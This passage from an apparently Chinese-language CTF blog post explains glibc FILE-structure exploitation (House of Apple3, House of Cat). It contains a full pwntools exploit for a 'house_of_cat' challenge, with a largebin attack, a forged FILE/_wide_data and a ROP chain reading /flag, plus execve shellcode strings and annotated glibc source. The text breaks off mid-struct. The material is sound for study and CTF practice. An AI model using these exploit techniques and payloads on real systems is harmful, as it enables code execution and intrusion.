<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># _flags = prev_size = 0</span></span><br><span class="line"><span class="comment"># _IO_read_ptr</span></span><br><span class="line">fake_file1 = <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x78</span></span><br><span class="line">fake_file1 += p64(heap_base)     <span class="comment"># _lock</span></span><br><span class="line">fake_file1 = fake_file1.ljust(<span class="number">0x90</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_file1 += p64(heap_base + <span class="number">0x290</span> + <span class="number">0x100</span>)    <span class="comment"># _wide_data</span></span><br><span class="line">fake_file1 = fake_file1.ljust(<span class="number">0xc8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_file1 += p64(IO_wfile_jumps - <span class="number">0x20</span>)      <span class="comment"># vtable</span></span><br><span class="line">fake_file1 = fake_file1.ljust(<span class="number">0x100</span> - <span class="number">0x10</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">fake_wide = <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x68</span></span><br><span class="line">fake_wide += p64(setcontext_61)     <span class="comment"># _wide_vtable + 0x68</span></span><br><span class="line">fake_wide = fake_wide.ljust(<span class="number">0xa0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_wide += p64(heap_base + <span class="number">0x1c90</span>)    <span class="comment"># rsp -&gt; orw_addr</span></span><br><span class="line">fake_wide += p64(p_rdi_r + <span class="number">1</span>)       <span class="comment"># rip -&gt; ret</span></span><br><span class="line">fake_wide = fake_wide.ljust(<span class="number">0xe0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_wide += p64(heap_base + <span class="number">0x290</span> + <span class="number">0x100</span>)     <span class="comment"># _wide_vtable</span></span><br><span class="line"></span><br><span class="line">fake_file1 += fake_wide</span><br></pre></td></tr></table></figure>

<p>WP如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding = utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line"><span class="comment"># context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;amd64&#x27;)</span></span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">local = <span class="number">2</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span> :</span><br><span class="line">	sh = process([<span class="string">b&quot;./ld.so&quot;</span>, <span class="string">b&quot;./pwn&quot;</span>], env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : <span class="string">b&quot;./libc.so.6&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">elif</span> local == <span class="number">2</span> :</span><br><span class="line">    sh = process(<span class="string">&quot;./house_of_cat&quot;</span>)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">	sh = remote(ip, port)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./house_of_cat&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :sh.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> text, data         :sh.sendafter(text, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :sh.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> text, data         :sh.sendlineafter(text, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num                :sh.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> text               :sh.recvuntil(text)</span><br><span class="line">uu32    = <span class="keyword">lambda</span>                    :u32(sh.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>                    :u64(sh.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">lg      = <span class="keyword">lambda</span> s                  :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">lgl     = <span class="keyword">lambda</span> s, value           :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, value))</span><br><span class="line"></span><br><span class="line">sh_x86_18=<span class="string">&quot;\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span></span><br><span class="line">sh_x86_20=<span class="string">&quot;\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span></span><br><span class="line">sh_x64_21=<span class="string">&quot;\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05&quot;</span></span><br><span class="line"><span class="comment">#https://www.exploit-db.com/shellcodes</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------------------------------------------------------------------------------------------#</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">admin</span>():</span><br><span class="line">    pld = <span class="string">&#x27;LOGIN | r00t QWB QWXFadmin&#x27;</span></span><br><span class="line">    sa(<span class="string">&#x27;mew mew mew~~~~~~\n&#x27;</span>, pld)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">choice</span>):</span><br><span class="line">    pld = <span class="string">&#x27;CAT | r00t QWB QWXF$\xff\xff\xff\xff&#x27;</span></span><br><span class="line">    sa(<span class="string">&#x27;mew mew mew~~~~~~\n&#x27;</span>, pld)</span><br><span class="line">    sla(<span class="string">&#x27;plz input your cat choice:\n&#x27;</span>, <span class="built_in">str</span>(choice))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx, size, content</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&#x27;plz input your cat idx:\n&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">&#x27;plz input your cat size:\n&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    sa(<span class="string">&#x27;plz input your content:\n&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">&#x27;plz input your cat idx:\n&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">&#x27;plz input your cat idx:\n&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    ru(<span class="string">&#x27;Context:\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, content</span>):</span><br><span class="line">    <span class="comment"># only twice</span></span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    sla(<span class="string">&#x27;plz input your cat idx:\n&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sa(<span class="string">&#x27;plz input your content:\n&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line">admin()</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x418</span>, <span class="string">b&#x27;pursue&#x27;</span>)    <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x438</span>, <span class="string">b&#x27;pursue&#x27;</span>)    <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x428</span>, <span class="string">b&#x27;pursue&#x27;</span>)    <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x468</span>, <span class="string">b&#x27;pursue&#x27;</span>)    <span class="comment"># 3</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">4</span>, <span class="number">0x468</span>, <span class="string">b&#x27;pursue&#x27;</span>)    <span class="comment"># 4</span></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">libc_base = u64(r(<span class="number">8</span>)) - <span class="number">0x21a0d0</span></span><br><span class="line">r(<span class="number">8</span>)</span><br><span class="line">heap_base = u64(r(<span class="number">8</span>)) - <span class="number">0xaf0</span></span><br><span class="line">lg(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">lg(<span class="string">&#x27;heap_base&#x27;</span>)</span><br><span class="line"></span><br><span class="line">IO_wfile_jumps = libc_base + <span class="number">0x2160c0</span></span><br><span class="line">setcontext_61 = libc_base + <span class="number">0x53a30</span> + <span class="number">61</span></span><br><span class="line">p_rdi_r = libc_base + <span class="number">0x000000000002a3e5</span></span><br><span class="line">p_rsi_r = libc_base + <span class="number">0x000000000002be51</span></span><br><span class="line">p_rdx_r12_r = libc_base + <span class="number">0x000000000011f497</span></span><br><span class="line">p_rax_r = libc_base + <span class="number">0x0000000000045eb0</span></span><br><span class="line">syscall_r = libc_base + <span class="number">0x0000000000091396</span></span><br><span class="line">lg(<span class="string">&#x27;setcontext_61&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># _flags = prev_size = 0</span></span><br><span class="line"><span class="comment"># _IO_read_ptr</span></span><br><span class="line">fake_file1 = <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x78</span></span><br><span class="line">fake_file1 += p64(heap_base)     <span class="comment"># _lock</span></span><br><span class="line">fake_file1 = fake_file1.ljust(<span class="number">0x90</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_file1 += p64(heap_base + <span class="number">0x290</span> + <span class="number">0x100</span>)    <span class="comment"># _wide_data</span></span><br><span class="line">fake_file1 = fake_file1.ljust(<span class="number">0xc8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_file1 += p64(IO_wfile_jumps - <span class="number">0x20</span>)      <span class="comment"># vtable</span></span><br><span class="line">fake_file1 = fake_file1.ljust(<span class="number">0x100</span> - <span class="number">0x10</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">fake_wide = <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x68</span></span><br><span class="line">fake_wide += p64(setcontext_61)     <span class="comment"># _wide_vtable + 0x68</span></span><br><span class="line">fake_wide = fake_wide.ljust(<span class="number">0xa0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_wide += p64(heap_base + <span class="number">0x1c90</span>)    <span class="comment"># rsp -&gt; orw_addr</span></span><br><span class="line">fake_wide += p64(p_rdi_r + <span class="number">1</span>)       <span class="comment"># rip -&gt; ret</span></span><br><span class="line">fake_wide = fake_wide.ljust(<span class="number">0xe0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_wide += p64(heap_base + <span class="number">0x290</span> + <span class="number">0x100</span>)     <span class="comment"># _wide_vtable</span></span><br><span class="line"></span><br><span class="line">fake_file1 += fake_wide</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">5</span>, <span class="number">0x418</span>, fake_file1)</span><br><span class="line">add(<span class="number">6</span>, <span class="number">0x458</span>, <span class="string">b&#x27;pursue&#x27;</span>)    <span class="comment"># 6</span></span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x468</span>, <span class="string">b&#x27;pursue&#x27;</span>)    <span class="comment"># 7</span></span><br><span class="line">add(<span class="number">8</span>, <span class="number">0x468</span>, <span class="string">b&#x27;pursue&#x27;</span>)    <span class="comment"># 8</span></span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">pld = p64(libc_base + <span class="number">0x21a0d0</span>) * <span class="number">2</span></span><br><span class="line">pld += p64(heap_base + <span class="number">0xaf0</span>)</span><br><span class="line">pld += p64(libc_base + libc.sym[<span class="string">&#x27;stderr&#x27;</span>] - <span class="number">0x20</span>)    <span class="comment"># bk_nextsize</span></span><br><span class="line">edit(<span class="number">2</span>, pld)</span><br><span class="line">add(<span class="number">9</span>, <span class="number">0x468</span>, <span class="string">b&#x27;pursue&#x27;</span>)    <span class="comment"># largebin_attack</span></span><br><span class="line"></span><br><span class="line">orw = p64(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line">orw += p64(p_rdi_r) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(p_rsi_r) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(p_rdx_r12_r) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(p_rax_r) + p64(<span class="number">3</span>)</span><br><span class="line">orw += p64(syscall_r)       <span class="comment"># close</span></span><br><span class="line">orw += p64(p_rdi_r) + p64(heap_base + <span class="number">0x1dd0</span>)</span><br><span class="line">orw += p64(p_rsi_r) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(p_rdx_r12_r) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(p_rax_r) + p64(<span class="number">2</span>)</span><br><span class="line">orw += p64(syscall_r)       <span class="comment"># open -&gt; fd = 0</span></span><br><span class="line">orw += p64(p_rdi_r) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(p_rdx_r12_r) + p64(<span class="number">0x30</span>) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(p_rsi_r) + p64(heap_base + <span class="number">0x3000</span>)</span><br><span class="line">orw += p64(p_rax_r) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(syscall_r)       <span class="comment"># read</span></span><br><span class="line">orw += p64(p_rdi_r) + p64(<span class="number">1</span>)</span><br><span class="line">orw += p64(p_rdx_r12_r) + p64(<span class="number">0x30</span>) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(p_rsi_r) + p64(heap_base + <span class="number">0x3000</span>)</span><br><span class="line">orw += p64(p_rax_r) + p64(<span class="number">1</span>)</span><br><span class="line">orw += p64(syscall_r)       <span class="comment"># write</span></span><br><span class="line">orw += <span class="string">b&#x27;/flag\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">10</span>, <span class="number">0x468</span>, orw)     <span class="comment"># 10</span></span><br><span class="line">edit(<span class="number">8</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x111</span>))    <span class="comment"># change top_chunk.size</span></span><br><span class="line"></span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line">sla(<span class="string">&#x27;plz input your cat idx:\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">0xf</span>))</span><br><span class="line">sla(<span class="string">&#x27;plz input your cat size:\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">0x468</span>))</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>





<h2 id="House-Of-Apple3"><a href="#House-Of-Apple3" class="headerlink" title="House_Of_Apple3"></a>House_Of_Apple3</h2><h3 id="利用原理-3"><a href="#利用原理-3" class="headerlink" title="利用原理"></a>利用原理</h3><p>主要是利用FILE结构体中的<code>_codecvt</code>成员和<code>_IO_wfile_jumps</code>中的函数，主要的调用链如下所示：<code>_IO_wfile_underflow -&gt; __libio_codecvt_in -&gt; (fp-&gt;_codecvt-&gt;__cd_in.step-&gt;__fct)(fp-&gt;_codecvt-&gt;__cd_in.step)</code>，或者是利用<code>_IO_wfile_underflow_mmap -&gt; __libio_codecvt_in -&gt; (fp-&gt;_codecvt-&gt;__cd_in.step-&gt;__fct)(fp-&gt;_codecvt-&gt;__cd_in.step)</code>，这里主要给出前者的利用思路。</p>
<p>以下是几个重要的结构体：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_iconv_t __cd_in;</span><br><span class="line">  _IO_iconv_t __cd_out;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> __<span class="title">gconv_step</span> *<span class="title">step</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> __<span class="title">gconv_step_data</span> <span class="title">step_data</span>;</span></span><br><span class="line">&#125; _IO_iconv_t;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">gconv_step</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> __<span class="title">gconv_loaded_object</span> *__<span class="title">shlib_handle</span>;</span>		<span class="comment">// 注意这个成员</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *__modname;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* For internal use by glibc.  (Accesses to this member must occur</span></span><br><span class="line"><span class="comment">     when the internal __gconv_lock mutex is acquired).  */</span></span><br><span class="line">  <span class="type">int</span> __counter;</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> *__from_name;</span><br><span class="line">  <span class="type">char</span> *__to_name;</span><br><span class="line"></span><br><span class="line">  __gconv_fct __fct;	<span class="comment">// 注意这个成员</span></span><br><span class="line">  __gconv_btowc_fct __btowc_fct;</span><br><span class="line">  __gconv_init_fct __init_fct;</span><br><span class="line">  __gconv_end_fct __end_fct;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Information about the number of bytes needed or produced in this</span></span><br><span class="line"><span class="comment">     step.  This helps optimizing the buffer sizes.  */</span></span><br><span class="line">  <span class="type">int</span> __min_needed_from;</span><br><span class="line">  <span class="type">int</span> __max_needed_from;</span><br><span class="line">  <span class="type">int</span> __min_needed_to;</span><br><span class="line">  <span class="type">int</span> __max_needed_to;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Flag whether this is a stateful encoding or not.  */</span></span><br><span class="line">  <span class="type">int</span> __stateful;</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> *__data;		<span class="comment">/* Pointer to step-local data.  */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">gconv_step_data</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> *__outbuf;    <span class="comment">/* Output buffer for this step.  */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> *__outbufend; <span class="comment">/* Address of first byte after the output</span></span><br><span class="line"><span class="comment">				 buffer.  */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Is this the last module in the chain.  */</span></span><br><span class="line">  <span class="type">int</span> __flags;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Counter for number of invocations of the module function for this</span></span><br><span class="line"><span class="comment">     descriptor.  */</span></span><br><span class="line">  <span class="type">int</span> __invocation_counter;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Flag whether this is an internal use of the module (in the mb*towc*</span></span><br><span class="line"><span class="comment">     and wc*tomb* functions) or regular with iconv(3).  */</span></span><br><span class="line">  <span class="type">int</span> __internal_use;</span><br><span class="line"></span><br><span class="line">  <span class="type">__mbstate_t</span> *__statep;</span><br><span class="line">  <span class="type">__mbstate_t</span> __state;	<span class="comment">/* This element must not be used directly by</span></span><br><span class="line"><span class="comment">			   any module; always use STATEP!  */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>主要函数的源码如下所示：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">wint_t</span></span><br><span class="line">_IO_wfile_underflow (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">cd</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">enum</span> __<span class="title">codecvt_result</span> <span class="title">status</span>;</span></span><br><span class="line">  <span class="type">ssize_t</span> count;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* C99 requires EOF to be &quot;sticky&quot;.  */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_EOF_SEEN)	<span class="comment">// 绕过检查</span></span><br><span class="line">    <span class="keyword">return</span> WEOF;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (fp-&gt;_flags &amp; _IO_NO_READS))		<span class="comment">// 绕过检查</span></span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> WEOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_read_ptr &lt; fp-&gt;_wide_data-&gt;_IO_read_end)		<span class="comment">// 绕过检查</span></span><br><span class="line">    <span class="keyword">return</span> *fp-&gt;_wide_data-&gt;_IO_read_ptr;</span><br><span class="line"></span><br><span class="line">  cd = fp-&gt;_codecvt;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Maybe there is something left in the external buffer.  */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)		<span class="comment">// 绕过检查，进入以下语句块</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* There is more in the external.  Convert it.  */</span></span><br><span class="line">      <span class="type">const</span> <span class="type">char</span> *read_stop = (<span class="type">const</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line"></span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_last_state = fp-&gt;_wide_data-&gt;_IO_state;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_base = fp-&gt;_wide_data-&gt;_IO_read_ptr =</span><br><span class="line">	fp-&gt;_wide_data-&gt;_IO_buf_base;</span><br><span class="line">      status = __libio_codecvt_in (cd, &amp;fp-&gt;_wide_data-&gt;_IO_state,		<span class="comment">// 进入目标函数</span></span><br><span class="line">				   fp-&gt;_IO_read_ptr, fp-&gt;_IO_read_end,</span><br><span class="line">				   &amp;read_stop,</span><br><span class="line">				   fp-&gt;_wide_data-&gt;_IO_read_ptr,</span><br><span class="line">				   fp-&gt;_wide_data-&gt;_IO_buf_end,</span><br><span class="line">				   &amp;fp-&gt;_wide_data-&gt;_IO_read_end);</span><br><span class="line"></span><br><span class="line">      fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr;</span><br><span class="line">      fp-&gt;_IO_read_ptr = (<span class="type">char</span> *) read_stop;</span><br><span class="line">      ......        </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">enum</span> __<span class="title">codecvt_result</span></span></span><br><span class="line"><span class="class">__<span class="title">libio_codecvt_in</span> (<span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">codecvt</span>, __<span class="title">mbstate_t</span> *<span class="title">statep</span>,</span></span><br><span class="line"><span class="class">		    <span class="title">const</span> <span class="title">char</span> *<span class="title">from_start</span>, <span class="title">const</span> <span class="title">char</span> *<span class="title">from_end</span>,</span></span><br><span class="line"><span class="class">		    <span class="title">const</span> <span class="title">char</span> **<span class="title">from_stop</span>,</span></span><br><span class="line"><span class="class">		    <span class="title">wchar_t</span> *<span class="title">to_start</span>, <span class="title">wchar_t</span> *<span class="title">to_end</span>, <span class="title">wchar_t</span> **<span class="title">to_stop</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">enum</span> __<span class="title">codecvt_result</span> <span class="title">result</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> __<span class="title">gconv_step</span> *<span class="title">gs</span> =</span> codecvt-&gt;__cd_in.step;</span><br><span class="line">  <span class="type">int</span> status;</span><br><span class="line">  <span class="type">size_t</span> dummy;</span><br><span class="line">  <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *from_start_copy = (<span class="type">unsigned</span> <span class="type">char</span> *) from_start;</span><br><span class="line"></span><br><span class="line">  codecvt-&gt;__cd_in.step_data.__outbuf = (<span class="type">unsigned</span> <span class="type">char</span> *) to_start;</span><br><span class="line">  codecvt-&gt;__cd_in.step_data.__outbufend = (<span class="type">unsigned</span> <span class="type">char</span> *) to_end;</span><br><span class="line">  codecvt-&gt;__cd_in.step_data.__statep = statep;</span><br><span class="line"></span><br><span class="line">  __gconv_fct fct = gs-&gt;__fct;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  <span class="keyword">if</span> (gs-&gt;__shlib_handle != <span class="literal">NULL</span>)		<span class="comment">// 绕过检查</span></span><br><span class="line">    PTR_DEMANGLE (fct);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="comment">// # define DL_CALL_FCT(fctp, args) (_dl_mcount_wrapper_check ((void *) (fctp)), (*(fctp)) args)</span></span><br><span class="line">  status = DL_CALL_FCT (fct,</span><br><span class="line">			(gs, &amp;codecvt-&gt;__cd_in.step_data, &amp;from_start_copy,</span><br><span class="line">			 (<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *) from_end, <span class="literal">NULL</span>,</span><br><span class="line">			 &amp;dummy, <span class="number">0</span>, <span class="number">0</span>));</span><br><span class="line">    ......</span><br><span class="line"><span class="comment">// 利用点</span></span><br><span class="line"><span class="comment">// fct(gs) -&gt; *(gs-&gt;__fct)(gs) -&gt; *(codecvt-&gt;__cd_in.step-&gt;__fct)(codecvt-&gt;__cd_in.step) -&gt;</span></span><br><span class="line"><span class="comment">// *(fp-&gt;_codecvt-&gt;__cd_in.step-&gt;__fct)(fp-&gt;_codecvt-&gt;__cd_in.step)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="House-Of-Cat"><a href="#House-Of-Cat" class="headerlink" title="House_Of_Cat"></a>House_Of_Cat</h2><h3 id="利用原理-4"><a href="#利用原理-4" class="headerlink" title="利用原理"></a>利用原理</h3><p>利用是<code>_IO_wfile_jumps</code>跳表中的<code>_IO_wfile_seekoff</code>函数，相关源码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_wfile_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_new_file_finish),</span><br><span class="line">  JUMP_INIT(overflow, (_IO_overflow_t) _IO_wfile_overflow),</span><br><span class="line">  JUMP_INIT(underflow, (_IO_underflow_t) _IO_wfile_underflow),</span><br><span class="line">  JUMP_INIT(uflow, (_IO_underflow_t) _IO_wdefault_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, (_IO_pbackfail_t) _IO_wdefault_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_wfile_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_file_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_wfile_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_new_file_setbuf),</span><br><span class="line">  JUMP_INIT(sync, (_IO_sync_t) _IO_wfile_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_wfile_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_file_read),</span><br><span class="line">  JUMP_INIT(write, _IO_new_file_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_file_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_file_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_file_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_ptr;	<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_end;	<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_base;	<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_base;	<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_ptr;	<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_end;	<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> 